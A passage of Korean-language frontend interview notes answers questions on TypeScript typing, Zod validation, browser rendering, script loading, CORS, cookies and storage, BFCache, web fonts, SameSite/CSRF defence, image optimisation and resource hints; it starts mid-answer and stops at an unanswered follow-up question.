  강제로 `as TUser` 라는 타입이라고 명시했다면 런타임 환경의 TS 엔진은 이 데이터가 정말 문자열 배열인지 확인할 권한이 없어 무사 통과시킵니다. 그러나 API 구조
  변경 등으로 서버가 `null`을 내려버리면 클라이언트 프론트는 순식간에 하얀 화면(에러)을 겪습니다. 이런 불상사를 막기 위해 `Zod` 등을 통해 스키마 객체 껍데기를
  만들어 페칭이 일어날 때 런타임 단계에서 타입 호환 여부(`Schema.parse(data)`)를 걸러내고, 유효하면 통과되어 Zod에 탑재된 `infer`로
  TypeScript 정적 체커로 안전하게 승계해주기 위한 프론트엔드 I/O 방어층 역할로 사용됩니다.
    - **[꼬리 질문 1]** 런타임 스키마 검증 시 정해진 스키마 규칙을 위반하는 데이터가 넘어올 경우 애플리케이션 화면에는 어떤 조치를 띄워줘야 하나요?
        - **A:** Zod 등의 `safeParse` 메서드는 예외 객체(Error Object)를 리턴합니다. 이것을 캐치하여 해당 I/O 계층(Fetcher)이나
          에러 바운더리(Error Boundary)에서 파싱 에러(로깅) 사실을 기록하고, 사용자에게는 "서버 점검 중이거나 데이터 구조가 일치하지 않습니다"라는 우회
          폴백(Fallback) 화면/문구를 안전하게 제공합니다.
    - **[꼬리 질문 2]** Zod 스키마를 구성할 때 프론트엔드 폼에서 입력받는 데이터 검증 시 `regex(정규식)` 및 `min/max` 길이 검사를 Zod에서
      담당하는 이유는 무엇인가요?
        - **A:** 타입스크립트 타입 시스템은 '문자열이다, 숫자다'라는 포맷만 가릴 뿐 이 문자가 이메일 패턴을 띠는지, 숫자가 10 이상인지 같은 프로그래밍적
          비즈니스 구체 구조(Range, Pattern)를 담지 못하기 때문입니다. 이러한 동적 값을 통계/보장하는 것을 유효성 검사 라이브러리가 겸사겸사 맡아줍니다.

### 17-2. 함수의 반환 타입 명시(Explicit Return Type) vs 자동 추론(Type Inference)

**Q: TypeScript에서 함수의 반환 타입을 명시적으로 선언하는 것과 컴파일러의 자동 추론에 맡기는 것의 장단점을 비교하고, 실무에서 어떤 방식을 지향해야 하는지
설명해주세요.**

- **A:** 타입스크립트는 강력한 타입 추론 엔진을 가지고 있어, 함수 내부의 `return` 문을 분석하여 자동으로 반환 타입을 결정할 수 있습니다.
  **자동 추론**에 맡기면 코드가 간결해지고 타이핑 비용이 줄어드는 장점이 있습니다. 특히 반환 타입이 단순하거나, 콜백 함수처럼 문맥상 타입이 명확한 경우 유용합니다.
  하지만 실무(특히 모듈의 경계, 라이브러리 개발, 복잡한 비즈니스 로직)에서는 함수의 시그니처를 **'계약(Contract)'**의 관점으로 바라보고 **명시적 선언**을
  지향하는 경우가 많습니다. 그 이유는 다음과 같습니다:
    1. **계약(Contract) 기반 설계와 구현의 분리**: 함수의 시그니처(매개변수와 반환 타입)는 제공자(Provider)와 호출자(Consumer) 간의 **엄격한
       계약**입니다. 반환 타입을 미리 명시하면, 내부 구현(`return` 문)이 개발자의 실수로 변경되었을 때 이 계약을 위반했음을 컴파일러가 **함수 내부에서 즉시
       에러로 잡아냅니다**. 반면 추론에 의존하면, 내부 로직 변경으로 반환 형태가 달라져도 컴파일러는 그것을 '새로운 스펙(계약 변경)'으로 조용히 수용해 버립니다. 결국
       이 함수를 믿고 가져다 쓰는 **외부 호출부 곳곳에서 연쇄적으로 엉뚱한 타입 에러가 터지게 되어** 디버깅과 원인 파악을 매우 고통스럽게 만듭니다.
    2. **가독성 및 문서화**: 코드를 읽는 다른 개발자가 함수 내부 로직을 다 읽어보지 않고도, 함수 시그니처만 보고 반환값을 즉각적으로 파악할 수 있어 훌륭한 문서
       역할을 합니다.
    3. **컴파일 성능 향상**: 명시적으로 타입을 선언하면 컴파일러가 반환값을 추론하기 위해 수행하는 내부 연산 비용을 줄여주므로, 거대한 규모의 프로젝트에서는 타입 체킹
       및 빌드 속도가 유의미하게 향상됩니다.

    - **[꼬리 질문 1]** 리액트(React) 컴포넌트를 작성할 때 `FC` (Function Component) 타입이나 명시적 리턴 타입(예:
      `JSX.Element`)을 생략하고 추론에 맡기는 경우가 많은데, 이것은 위험한 안티 패턴인가요?
        - **A:** 반드시 안티 패턴은 아닙니다. React 생태계에서는 컴포넌트가 화면 요소나 `null`을 반환한다는 것이 명확하고, 암묵적인 컨벤션이 강하게
          잡혀있기 때문에 굳이 반환 타입을 명시하지 않고 추론에 맡겨 코드를 간결하게 유지하는 것을 선호하는 팀도 많습니다. 이는 프로젝트와 팀의 린트(Lint) 규칙
          컨벤션에 따라 유연하게 선택할 문제입니다.
    - **[꼬리 질문 2]** 반대로, 반환 타입을 명시하는 것보다 타입 추론(Type Inference)에 맡기는 것이 구조적으로 훨씬 더 유리한 구체적인 사례는
      무엇인가요?
        - **A:** 배열의 `map`, `filter` 등에 넘기는 **익명 화살표 함수(콜백)** 의 경우입니다. 이들은 문맥상 타입이 명확하게 결정(
          Contextual
          Typing)되므로 굳이 반환 타입을 명시하면 코드만 장황해집니다. 또한, `as const` (Const Assertion)를 사용하여 **상수 리터럴 타입의
          튜플이나 객체를 반환**할 때는, 복잡한 리터럴 타입을 일일이 손으로 적는 것보다 컴파일러의 좁혀진 추론을 그대로 반환하게 두는 것이 훨씬 안전하고 유지보수가
          쉽습니다.

### 15. 브라우저 렌더링 파이프라인 (Layout vs Paint)

**Q: 브라우저 렌더링 파이프라인(Rendering Pipeline)의 전체적인 흐름을 설명하고, Layout과 Paint 단계의 비용 차이를 성능 최적화 관점에서 설명해주세요.
**

- **A:** 브라우저는 HTML 파싱으로 DOM 트리를 구축하고, CSS 파싱으로 CSSOM 트리를 생성합니다. 이 둘을 결합하여 화면에 실제로 보일 노드들만 모아 렌더 트리(
  Render Tree)를 만듭니다. 이후 각 노드의 정확한 위치와 기하학적 크기를 수학적으로 계산하는 **Layout(Reflow)** 단계, 픽셀 단위로 색상과 텍스트를 채워
  넣는 **Paint(Repaint)** 단계, 그리고 독립적인 레이어들을 화면에 겹쳐서 최종 표출하는 **Composite(합성)** 단계를 거칩니다.
  요소의 너비나 마진 등 기하학적 형태를 변경하면, Layout부터 다시 발생해 필연적으로 Paint와 Composite까지 연쇄적으로 유발하므로 GPU 및 CPU 연산 비용이
  매우 비쌉니다. 반면, 단순히 배경색만 바꾸면 Layout은 건너뛰고 Paint부터 시작됩니다. 따라서 성능 최적화를 위해 애니메이션을 넣을 때는 Layout과 Paint
  연산을 완전히 생략하고 바로 Composite(GPU 가속)만 트리거하는 `transform`이나 `opacity` 속성을 사용하는 것이 권장됩니다.
  _ **[꼬리 질문 1]** Layout Thrashing(강제 동기 레이아웃) 현상이란 무엇이며 어떻게 방지할 수 있나요?
  _ **A:** 위치나 크기 같은 기하학적 요소를 변경한 직후 자바스크립트에서 곧바로 다시 `offsetWidth`, `scrollTop` 등의 속성을 읽으려 시도하면,
  브라우저가 최신 값을 반환하기 위해 기다리던 레이아웃 렌더 큐(Queue)를 강제로 비우고 즉시 동기 레이아웃 갱신을 수행하게 됩니다. 이 짓을 반복하면 엄청난 렌더링 부하가
  발생하는데, 이를 피하려면 DOM 읽기(Read) 작업과 쓰기(Write) 작업을 변수에 캐싱해 분리하여 일괄 처리하거나, `requestAnimationFrame`을 사용해야
  합니다.
  _ **[꼬리 질문 2]** CSS 속성 중 `will-change`는 어떤 상황에 쓰는 것이 바람직하며 어떤 부작용이 있나요?
  _ **A:** 애니메이션이 복잡하여 프레임 드랍이 생길 때, "이 요소는 나중에 확실히 변할 거야"라고 브라우저에게 미리 힌트를 주어 별도의 합성 레이어로 빼놓게(승격) 하는
  최적화 기법입니다. 단, 남용하게 될 경우 브라우저 렌더러가 처리해야 할 레이어가 수천 개로 쪼개져 메모리가 폭주하는 오버헤드를 일으키므로 정말로 필요한(애니메이션 중인)
  요소에만 활성화했다가 제거해야 합니다.

### 16. 스크립트 로드 파싱 최적화 (`async` vs `defer`)

**Q: 스크립트 로딩 방식인 `<script>`, `<script async>`, `<script defer>`의 차이점과 다운로드 및 실행 타이밍을 HTML 파싱과 연관 지어
설명해주세요.**

- **A:** 일반 `<script>` 태그를 만나면 브라우저는 무조건 하던 HTML 파싱 작업을 멈추고(Blocking), 스크립트를 다운로드하여 실행까지 전부 마친 뒤에야
  파싱을 재개합니다. 용량이 큰 파일이라면 화면 렌더링이 오랫동안 정지됩니다.
  `<script async>`는 HTML 블로킹 없이 브라우저가 스크립트를 **비동기로(병렬)** 다운로드합니다. 단, 다운로드가 끝나면 그 즉시 HTML 파싱을 짧게 멈추고
  우선적으로 스크립트를 실행합니다. (여럿일 경우 먼저 완료된 순으로 실행되므로 실행 순서 보장 불가).
  `<script defer>` 역시 비동기로 하위 백그라운드에서 다운로드를 함께 진행하지만, 스크립트 실행은 브라우저 상의 HTML 문서 파싱이 100% 완전히 끝난 후(
  `DOMContentLoaded` 트리거 직전)에 문서에 명시된 원래의 삽입 순서대로 매끄럽게 실행합니다. (초기 렌더링 최적화의 핵심 권장 속성).
  _ **[꼬리 질문 1]** 그러면 굳이 실행 순서를 보장받기 힘든 `async`는 실무에서 언제 사용하는 것이 좋은가요?
  _ **A:** DOM 의존성이 전혀 없고 각 파일별 로직의 순서가 중요하지 않은 구글 애널리틱스(GA), 카카오 픽셀 등 제3자 광고/분석 스크립트 용도로 붙일 때 페이지
  로딩 딜레이 없이 가장 빨리 독립적으로 로드되도록 하기 위해 사용합니다.
  _ **[꼬리 질문 2]** SPA(Single Page Application) 환경(React, Vite 환경)에서 번들링된 메인 JS 파일들은 보통 `index.html`
  에서 어떤 속성을 지니고 로드되나요?
  _ **A:** 메인 JS 뭉치(Bundle)는 화면에 그릴 모든 Virtual DOM 코드와 어플리케이션 동작 원리를 지니고 있으므로 HTML 트리가 파싱되어 최상단
  `<div id="root">` 요소가 완성된 이후에 실행되어야 마운트를 성공적으로 수행할 수 있습니다. 따라서 번들러 플러그인이 보통 파일에 `defer`를 부착하거나 구형
  방식으로 항상 `<body>` 최하단 끝 꼬리에 배치시킵니다.

### 17. CORS 오리진 정책과 Preflight 최적화

**Q: CORS 정책의 필수성과, 브라우저가 Preflight 요청(`OPTIONS` 메서드)을 먼저 보내는 조건 및 그 목적을 설명해주세요.**

- **A:** 브라우저는 해킹 공격 방어 원칙상 자신이 속한 원래 출처(동일 출처 정책/SOP) 안에서만 네트워크를 하도록 막혀 있지만, 실제 서비스는 타 도메인의 API 서버
  자원과 교차해야 하므로, 서버가 명시적으로 응답 헤더(`Access-Control-Allow-Origin`)를 주어 허락하게 만드는 예외 규정이 CORS입니다.
  `GET`, `POST` 등의 단순한(Simple Request) 조건(커스텀 헤더가 없고 일반 Content-Type 등)을 갖추지 못하고, `application/json`
  타입이나 내 맘대로 만든 토큰 허가(`Authorization`) 헤더가 붙은 경우 브라우저는 본 요청을 날리기 전 `OPTIONS`라는 찌르기용 Preflight 요청을 미리
  날립니다. 이는 실제 데이터가 삭제/수정되는 요청이 백엔드로 그냥 관통되기 전에, 해당 출처에서 이 HTTP 메서드와 커스텀 헤더를 서버가 수용할 준비가 되어 있는지를 검사하여
  보안 오작동을 원천 보호하려는 목적입니다.
  _ **[꼬리 질문 1]** 사용자가 매번 API 요청을 보낼 때마다 Preflight가 같이 날아가면 결국 서버 왕복(RTT) 비용이 곱절이 되어 엄청 느려질 텐데, 프론트와
  백이 어떻게 최적화할까요?
  _ **A:** 백엔드 서버에서 CORS 검증 시 응답 헤더에 `Access-Control-Max-Age` 값을 (예: 24시간) 크게 늘려 설정하도록 합의해야 합니다. 이렇게
  되면 브라우저가 Preflight 검증 통과 내역을 스스로 캐싱(기억)하여 반복된 요청에서는 이중으로 `OPTIONS`를 날리지 않고 즉시 본 요청을 실행하여 속도를 높입니다.
  _ **[꼬리 질문 2]** 그렇다면 인증 토큰이나 유저 세션을 위해 클라이언트가 쿠키(`Cookie`) 정보를 타 도메인 백엔드로 함께 실어 보내려면 프론트 엔드의 fetch
  로직과 백엔드 헤더에 각각 무엇이 추가되어야 하나요?
  _ **A:** 프론트 엔드(Client) 쪽 코드에서는 fetch 옵션 부분에 `credentials: 'include'`를 선언해야 합니다. 백엔드(Server) 쪽에서는
  반드시 응답 헤더에 `Access-Control-Allow-Credentials: true`를 세팅해야 하며, 이 인증 상태에서는 Origin 헤더에 무분별한 와일드카드(
  `*`) 허용 대신 구체적인 프론트엔드의 도메인 출처를 1:1로 정확하게 짚어서 응답해 주어야만 통과됩니다.

### 18. 쿠키, 로컬 스토리지, 세션 스토리지 비교

**Q: 브라우저 저장소 체계인 쿠키, 로컬 스토리지, 세션 스토리지의 차이점을 수명(만료 주기) 및 용도 측면에서 비교하여 설명해주세요.**

- **A:**
    - **쿠키(Cookie):** 용량이 아주 작으며(약 4KB), 한 번 생성하면 HTTP 통신 때마다 모든 요건(도메인 규칙 내)에 자동으로 브라우저가 Request
      Header에 포함해 날려 보냅니다. 서버 생성 및 만료 시간 자유 세팅으로, 로그인 유지 기반 데이터나 서버 로드 밸런싱 세션 등을 방어할 때 쓰입니다. JS 탈취를
      막는 HTTP-Only 기능이 독보적입니다.
    - **로컬 스토리지(LocalStorage):** 영구 저장이 가능한 브라우저 내장 데이터(약 5MB)입니다. 사용자가 캐시를 지우지 않는 한 브라우저를 껐다 켜도
      데이터가 파기되지 않고 유지됩니다. 클라이언트에서만 제어하므로 화면 테마(다크 모드), 비로그인 사용자 바구니, UI 레이아웃 상태 등을 저장하는 용도로 최적입니다.
    - **세션 스토리지(SessionStorage):** 로컬 스토리지와 스펙 및 용량은 100% 동일하지만 무조건 '브라우저 탭 세션 단위'로만 생명주기가 유지됩니다.
      하나의 탭 화면이 종료(Close)되거나 완전히 새로운 탭으로 분리 오픈되는 순간 즉시 내장 데이터베이스가 파기되므로, 민감한 임시 금융 폼이나, 일회성 검색 조건 임시
      데이터 보호에 활용됩니다.

    * **[꼬리 질문 1]** 한 브라우저의 같은 도메인일 때 로컬 스토리지와 세션 스토리지는 여러 개의 서로 다른 탭끼리 데이터가 공유되나요?
        - **A:** 로컬 스토리지는 브라우저 전체의 도메인 저장소이므로 모든 탭끼리 실시간으로 동일한 값을 공유합니다(수정 이벤트 또한 전파됨). 반면 세션 스토리지는
          오직 현재 구동 중인 단일 탭 내부에 묶여 있어, 똑같은 도메인을 열어도 두 개의 탭끼리는 데이터가 분리되고 호환되지 않습니다.
    * **[꼬리 질문 2]** XSS 공격(크로스 사이트 스크립팅)으로 자바스크립트를 이용해 해커가 유저의 액세스 토큰을 빼가려 한다고 가정할 때, 로컬 스토리지와 쿠키 중
      어느 곳에 토큰을 저장하는 게 더 안전한가요?
        - **A:** JS로 생성/접근이 영원히 노출되어 열려 있는 로컬 스토리지는 XSS 공격에 100% 탈취당합니다. 반면 쿠키에 `HttpOnly` 속성을 선언하여
          박아놓으면 자바스크립트 스코프(`document.cookie`)의 접근 권한이 브라우저 차원에서 완전히 금지되므로, 백엔드 서버만이 이 토큰을 열어볼 수 있어
          XSS 방어에 압도적으로 강력합니다. (다만 CSRF 방어 절차는 별도로 필요).

### 19. UX 브라우저 특권 (BFCache 최적화)

**Q: 빠른 페이지 전환을 제공하는 브라우저 최적화 기능인 BFCache(Back/Forward Cache) 매커니즘에 대해 설명해주세요.**

- **A:** 사용자가 쇼핑 목록 등에서 '링크'를 눌러 떠났다가, 브라우저 기본의 **'뒤로가기'** 혹은 **'앞으로 가기'** 화살표를 눌렀을 때 발동하는 강력한 자원 효율
  네비게이션입니다. 브라우저는 방금 방문했던 이전 페이지를 단순히 HTML 코드 쪼가리만 저장하는 수준을 넘어, 스크롤 위치, 입력 폼 상태, 그리고 렌더 트리의 레이아웃과 JS
  자바스크립트 힙(Heap) 메모리 상태 스냅샷을 '통째로 얼려서' 멈춰놓는 특수 상태로 기록(Cache)합니다. 이 덕분에 뒤로가기를 쳤을 때 복잡한 로딩/파싱/Layout을
  전부 다시 치를 필요 없이 즉각적으로 화면을 얼음땡 복원하여 놀라운 쾌적함을 주게 됩니다.
    - **[꼬리 질문 1]** 개발자가 전역 이벤트(window)에 `unload` 리스너를 달 경우 BFCache 동작에 어떤 악영향을 초래하나요?
        - **A:** 브라우저 엔진은 `unload` 이벤트가 바인딩되어 있다면 "아, 이 개발자가 페이지를 나갈 때 임의의 스크립트 잔여물을 청소하거나 특정 조작을
          확정해 버렸구나"라고 판단하여, 완전한 초기화가 되었다고 보고 해당 사이트는 아예 BFCache 캐싱 대상 명단에서 영구 탈락(부적격)시켜버립니다. 그래서 대신
          최신 표준인 `pagehide`나 `visibilitychange` 이벤트를 리스닝하여 페이지 소멸 처리를 다뤄야 합니다.
    - **[꼬리 질문 2]** 그러면 BFCache 상태로 얼어붙어 있던 페이지가 사용자가 뒤로가기로 돌아오면서 '다시 통째로 해동'되었을 때, 이를 JS로 인지하고 트래킹(
      조회수 재갱신 등)을 하려면 무슨 이벤트 라이프사이클을 써야 하나요?
        - **A:** `pageshow` 이벤트를 감지하면서, 인자로 들어오는 객체의 속성 값인 `event.persisted === true` 조건문을 검증하면 일반
          로드가 아니라 BFCache에서 깨어나 재활성화되었다는 판정이 성립되어 후속 트래픽 로직을 다룰 수 있습니다.

### 20. Intersection Observer API의 메인 스레드 구조 우월성 => 굳

**Q: 지연 로딩이나 무한 스크롤 구현 시, Intersection Observer API가 기존 스크롤(Scroll) 이벤트 리스너 반복 조사 방식보다 프론트 성능에 압도적으로
유리한 이유를 설명해주세요.**

- **A:** 과거 무한 스크롤은 마우스 스크롤 이벤트(`scroll`)마다 콜백이 수십 번씩 무지막지하게 터지므로 쓰로틀링(기다림 억제)이 필연적이었고, 그 콜백 안에서 타겟
  요소가 화면에 보일 위치에 닿았는지 `getBoundingClientRect()`나 `offsetTop` 코드를 호출했습니다. 그런데 이 코드가 호출될 때마다 브라우저는 정확한
  수치 반환을 이유로 자바스크립트 진행을 메인 스레드에서 무조건 올 스탑시키고 강제로 CSS 렌더 구조를 동기 연산하는 레이아웃 쓰레싱(Layout Thrashing)을 미친듯이
  유발했습니다.
  반면 Intersection Observer API는 이 수치 가시성 계산 로직을 자바스크립트 메인 스레드 바깥(보통 별도의 브라우저 내부 스레드나 매우 최적화된 백그라운드
  틱)에서 비동기적(Asynchronous)으로 전담 처리해 줍니다. 그리고 요소가 화면 틈새에 나타나거나 교차하는 순간이 오직 관측됐을 때만 콜백을 여유롭게 통보해 주므로
  렌더링을 잡아먹는 블로킹이 원천 소거되며 압도적인 60fps 인터랙션을 유지합니다.
  _ **[꼬리 질문 1]** Intersection Observer 인자 중 `threshold` 배열 옵션은 어떤 디테일한 교차 판정을 제어하나요?
  _ **A:** 해당 타겟 태그가 화면 영역 안에 몇 % (0.0 이면 1픽셀만 닿을 때, 1.0 이면 요소 100%가 전부 완벽히 들어왔을 때) 교차되었는지를 비율로
  트리거하는 지점을 조율해줍니다. `[0, 0.5, 1]`처럼 설정하면 들어올 때와 50% 찰 때, 완전히 나갈 때마다 세 번의 콜백을 터트려 줍니다.
  _ **[꼬리 질문 2]** 이 API는 가시성이나 교차 판정을 기본적으로 브라우저의 전역 '뷰포트(창 크기 자체)' 앵글 기준으로 수행합니다. 이걸 브라우저가 아니라 내가
  만든 작은 div 스크롤 박스 기준으로 타겟 교차를 세팅하려면 어떤 속성을 부여해야 하나요?
  _ **A:** 관찰자 인스턴스를 초기화(new Option)할 때 컨테이너 옵션인 `root` 속성 값으로 내가 스크롤을 굴리는 부모 `div` 특정 요소 돔 자체를 지정해
  주면 해당 컨테이너 내부의 기준으로 계산 축이 달라집니다.

### 21. FOIT와 FOUT 웹 폰트 로드 렌더링 최적화

**Q: 외부 웹 폰트 파일 로딩 과정에서 나타나는 시각적 현상인 FOIT와 FOUT를 간략히 설명하고, UX를 저해하지 않는 폰트 최적화 해결책을 제시해주세요.**

- **A:** 웹 폰트(TTF, WOFF 등)가 로딩되는 동안 브라우저는 이 폰트 텍스트를 잠시 투명하게 지워버리는 현상이 발생하는데 이를 **FOIT (Flash of
  Invisible Text)** 라 부르며 사용자에게 엄청난 공백 불쾌감을 줍니다. 반대로 일단 있는 모양 없는 모양으로 기본 못난이 시스템 폰트를 띄워 정보를 보여주다가
  다운로드가 완료되는 찰나 순간적으로 폰트가 적용되며 크기와 높이, 줄바꿈 요소가 깜빡이며 깨지는 이질적 현상이 **FOUT (Flash of Unstyled Text)**
  입니다. 구글과 사파리는 처리에 각기 다르지만 둘 다 악몽일 수 있습니다.
  최상의 UX를 위한 폰트 최적화는 2가지를 병용합니다. 첫째, 폰트는 HTML보다 무거워 맨 마지막에 통신하려 드는 악질이라 HTML 헤드 최상단 영역에
  `<link rel="preload" as="font" ...>` 를 통해 페이지 진입 순간 첫 번째 1순위 자산(중요도 가산)으로 빨리 받아오도록 힌트를 줍니다. 둘째,
  CSS 선언부에 `font-display: swap` 옵션을 겁니다. 이 옵션을 켜면 FOIT라는 공백 없이 일단 바로 시스템 폰트를 칠해서 사용자가 글씨를 빠르게 100%
  읽게 허락해 주다가(FOUT 유도), 파일 로드가 매끄럽게 끝나면 폰트를 부드럽게 맞바꾸는 전략으로 화면 CLS(레이아웃 밀림) 붕괴 없이 로딩 효율을 극대화하게 됩니다.
  _ **[꼬리 질문 1]** 수 MB 단위의 대용량 아시아권 웹 폰트 한글 파일을 용량 최적화하여 압축 전송/서브 세팅하기 위해 채택하는 방식 2가지는 무엇인가요?
  _ **A:** 첫째, 무거운 압축 기술인 WOFF2 포맷으로 컴파일하여 구형 eot나 ttf 파일 대비 기본 용량을 낮춥니다. 둘째, '가~힣' 등 무제한 조합을 배포하지
  않고, '다람쥐 헌 쳇바퀴' 처럼 필수 UI 단어나 완성형 한글 핵심 글자에만 매칭되는 유니코드 블록(서브셋)만 모아서 `unicode-range` 속성으로 분절해서 자르거나(
  Chunked) 부분 파일링만 다운로드합니다.
  _ **[꼬리 질문 2]** 다운로드 전 렌더링 딜레이를 예방하기 위해 사용할 수 있는 베이스 64(Base64) 데이터 URI 방식이란 어떻게 폰트를 꽂는가요?
  _ **A:** 폰트 바이너리를 긴 문자열의 영문자 형태로 변환하여 CSS 파일의 `@font-face` 속성 안에 텍스트 하드코딩 값(Data URI)으로 통째로 임베딩(
  집어넣음)해 버립니다. 이렇게 되면 별도로 폰트를 받기 위한 네트워크 HTTP 파이프라인 호출이 0회로 사라지며 즉각 동작하지만, CSS 파일 자체가 30% 이상 무거워지는
  대가가 있어서 아주 작은 시스템 폰트 단 1개에만 매우 조심스럽게 사용해야 합니다.

### 22. SameSite 쿠키 보안 원칙 (Strict, Lax, None)

**Q: 브라우저 쿠키의 SameSite 속성 3가지(`Strict`, `Lax`, `None`)의 차이점과 CSRF(교차 사이트 요청 위조) 공격 방어 메커니즘을 설명해주세요.
**

- **A:** 브라우저 사용자가 로그인한 상태에서 해커의 다른 악성 사이트로 강제로 진입해 거기서 무단으로 POST 버튼 따위를 누를 때, "브라우저가 바보처럼 로그인이 묻어
  있는 쿠키를 목적 은행 사이트로 알아서 동봉해 날려주어" 발생하는 보안 참사가 CSRF 도용 공격입니다. 브라우저는 이를 통제하기 위해 다른 사이트로 이동이나 요청 시 쿠키
  파견 여부를 나누는 SameSite 정책을 지킵니다.
    - **Strict:** 다른 출처의 사이트 구역에서 넘어오는 어떠한 외부 요청이나 심지어 링크 탐색/클릭 방문 조차 쿠키 전송을 무자비하게 틀어 막습니다. 방어는 절벽
      수준으로 강력하지만, 외부 이메일 링크를 타고 왔을 때 로그인 세션이 자꾸 풀려버려 UX 분노가 큽니다.
    - **Lax:** 모던 브라우저들의 (보안 밸런스) 기본 채택 옵션입니다. 안전하고 화면 탐색 목적이 띠는 Top-level 이동(예: 즐겨찾기 클릭, 구글 검색 결과에서
      `GET` 방식으로 a 태그 눌러 넘어오기)에는 쿠키 전송을 너그럽게 배정해 주고, 남이 장난으로 내 사이트에 박아놓은 `POST` 양식이나 `iFrame` 백그라운드
      전송에는 쿠키 동맹을 닫아버립니다.
    - **None:** 타 사이트 요청에도 조건 따위 없이 모든 십자 포화에 무제한 크로스(Cross) 쿠키를 수용합니다. 단, 보안 리스크상 쿠키 선언 시 반드시 자물쇠(
      `Secure`) 옵션을 함께 묶어서 HTTPS 암호화 위에서만 타 도메인 쿠키가 살아 숨 쉴 수 있도록 강제 규제를 겁니다. (크롬 80 버전부터 법제화됨)

    * **[꼬리 질문 1]** 브라우저는 타겟 서버가 아닌데도 자신이 서 있는 현재 위치 "출처(Origin)"가 동일 사이트인지 다른 교차 사이트인지 어떻게 구분하는
      건가요?
        - **A:** 접속해 있는 브라우저 주소창의 3가지 요소 구성, 즉 프로토콜(http/https), 도메인 호스트명(www.naver.com), 그리고 포트(
          80/443 번호)가 타겟 서버 궤적과 이 중 단 하나라도 다르면 서로 다른(Cross-Site) 출처로 취급하며 보안 시스템을 가동합니다.
    * **[꼬리 질문 2]** 어쩔 수 없이 프론트(api.test.com)와 백엔드(test.com) 환경이 Subdomain 수준으로 달라서 CSRF 토큰을 None,
      Lax 등으로 방어하기 까다로울 때, 클라이언트가 HTTP 헤더를 통해 독자적으로 교차 방어하는 대안 아키텍처는 무엇인가요?
        - **A:** `Double Submit Cookie` 패턴이나 `Custom Header` 검증을 사용합니다. 프론트는 로컬스토리지에도 CSRF 보안키를 동시에
          임의 구성한 다음, HTTP 요청 시 `X-CSRF-Token` 이르는 특별한 사용자 커스텀 헤더에 수동으로 값을 함께 때려 박아 날립니다. CSRF 공격자는
          DOM 스크립트에 접속하지 못하면 이 내부 커스텀 헤더 구조를 위조할 수 없으므로(쿠키만 자동으로 딸려가므로) 서버가 이 둘의 불일치를 잡아내서 무력화합니다.

### 23. 웹 이미지 최적화(Responsive, Lazy loading, Format)

**Q: 웹 페이지 퍼포먼스를 위해 프론트엔드 환경에서 이미지 로딩 최적화를 달성할 수 있는 여러 가지 기법들을 설명해주세요.**

- **A:** 우선, 매우 무겁고 느린 JPEG/PNG 대신, 압축률이 우수하고 화질을 방어하는 모던 포맷인 **WebP**나 **AVIF** 포맷을 채택합니다.
  두 번째, **반응형 이미지(`srcset`, `sizes`) 태그**를 활용합니다. 모바일 유저에게 불필요하게 4K 해상도 이미지를 내려주지 않고, 브라우저가 기기의
  Width나 DPR 환경에 맞춰 최적의 해상도 파일을 택일 다운로드하도록 힌트를 제공합니다.
  세 번째, 브라우저 지연 로딩 속성(**`<img loading="lazy">`**)을 부여하여, 현재 스크롤(뷰포트) 바깥에 위치해 당장 보이지 않는 수십 개의 하단
  이미지들은 다운로드를 유보시켰다가 근처에 스크롤이 다가올 때 비로소 파이프라인으로 요청하여 메인 스레드 대역폭 점유를 획기적으로 개선합니다.
  마지막으로, 구형 브라우저에서 WebP 지원 여부를 판별하여 우회(Fallback) JPEG를 안전하게 내려주기 위해 `<picture>` 및 `<source>` 분기 태그로
  래핑하는 설계를 가져갑니다.
  _ **[꼬리 질문 1]** `loading="lazy"` 속성은 편하지만, 만약 화면 최상단 배너(LCP 요소) 이미지에 실수로 이 속성을 달아버리면 어떤 불상사가
  발생하나요?
  _ **A:** 최상단 LCP 요소에 지연 로딩을 달면, 브라우저 스캐너가 문서를 렌더링할 때 "어차피 지연 대상이니 나중에 받자"라며 우선순위 대역폭에서 최하위로 밀어냅니다.
  이 때문에 사용자가 체감하는 첫 번째 거대 의미 그림의 등장 속도(LCP 지표)가 끔찍하게 악화되어 UX와 구글 SEO 점수에 페널티를 받게 됩니다. 최상위는 무조건
  Eager/Preload로 빼야 합니다.
  _ **[꼬리 질문 2]** 다운로드를 늦추는 지연 로딩 외에도, 화면 UI가 덜컥거리며 밀려나는 부작용, 즉 CLS(Cumulative Layout Shift)를 방어하기
  위해 CSS/HTML 이미지 태그에 무엇을 선언해주어야 하나요?
  _ **A:** 반드시 이미지의 로딩 전이라 할지라도 브라우저가 그림이 차지할 빈 공간의 비율(Aspect-Ratio)을 미리 유추하여 상자 레이아웃을 예약 확보할 수 있도록,
  `width`와 `height` 속성의 절대값(혹은 CSS `aspect-ratio`)을 명시해 박스를 고정시켜야 주변 글씨가 밀리지 않습니다.

### 24. 리소스 우선순위 힌트 (Preload, Prefetch, Preconnect)

**Q: 브라우저가 화면을 빠르게 보여주기 위해 렌더링 차단 리소스를 해소하거나 당길 때 사용하는 Preload, Prefetch, Preconnect 힌트 속성들의 차이점과
쓰임새를 각각 정리해주세요.**

- **A:** 이 헤더 태그들은 브라우저 엔진 측에 개발자가 귓속말로 우선순위 힌트를 알려주는 명세 최적화 기능입니다.
    - **`rel="preload"`:** 현재 첫 접속 화면 렌더링을 띄우는 데 있어 **초 단위로 급박하게 필수적(Highest)인 자산**(예: 메인 웹 폰트, 히어로
      큰 이미지, 중요 파싱 JS)을 향해 씁니다. 브라우저 스캐너가 다른 잡다한 CSS 파일 전송보다 최우선 대역폭으로 끄집어와서 미리 다운로드 체인을 엽니다.
    - **`rel="prefetch"`:** 현재 페이지의 렌더링에는 필요 없지만, 이 유저가 **다음 페이지로 곧 이동할 확률이 대단히 높을 때 미래 화면을 위해
      백그라운드에서 여유롭게(Lowest) 받아 두는(캐싱)** 용도입니다. (예: 장바구니 구경 중 '결제화면.js' 모듈 뭉치 긁어오기). 남는 네트워크 유휴 시간에
      동작합니다.
    - **`rel="preconnect"`:** 리소스 뭉치를 당장 다운받는다는 것이 아닙니다. 웹 통신 전 DNS 조회, TCP 핸드셰이크, TLS(HTTPS) 암호화 수립
      등 까다로운 통신 징검다리 3단계를 "미리 미리 뚫어두어 TCP 파이프 포트를 개방해달라"는 뜻입니다. 나중에 써드파티(예: s3.amazon.com)의 이미지나 API
      주소 호출이 필요해질 때 이 통신 준비 딜레이를 0.5초 이상 단축시킬 수 있습니다.

    * **[꼬리 질문 1]** 그러면 세상 모든 파일들을 전부 다 `<link rel="preload">`로 설정해서 빠르게 당겨오면 좋은 것 아닌가요?
